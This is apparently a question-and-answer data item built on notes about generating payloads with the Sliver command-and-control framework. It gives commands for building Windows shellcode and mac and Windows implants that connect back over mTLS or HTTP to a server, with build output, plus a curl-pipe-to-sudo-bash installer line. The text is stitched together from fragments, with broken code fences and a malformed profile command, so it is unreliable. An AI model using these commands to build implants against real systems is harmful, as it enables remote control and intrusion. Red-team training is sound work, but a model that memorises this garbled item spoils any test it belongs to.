Context:# Payload Generation on Sliver for Windows

Here are some  commands for generating payloads on Sliver, specifically targeting Windows.

## Generating a Windows Shellcode Payload
Create a new profile called `win-shellcode` that uses mutual TLS and connects to the server IP **192.168.122.1** in **shellcode** format.
```bash
sliver > profiles new --mtls 192.168.122.1 --format shellcode win-shellcode my_profile
sliver > generate --profile my_profile
For a Linux server, you can also use the one liner installation `curl https://sliver.sh/install|sudo bash`
```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Sliver binary
[*] Build completed in 00:00:09
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
## Generate the Implant
#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA

 Question: Provide a complete example of using the generate command in Sliver to create a payload. The example should include common parameters and the expected output. Respond with just a few command line. 

 Your response: 
```

#### Advanced Example

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os windows

[*] Generating new amd64 implant binary
[*] Build completed in 00:00:07
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```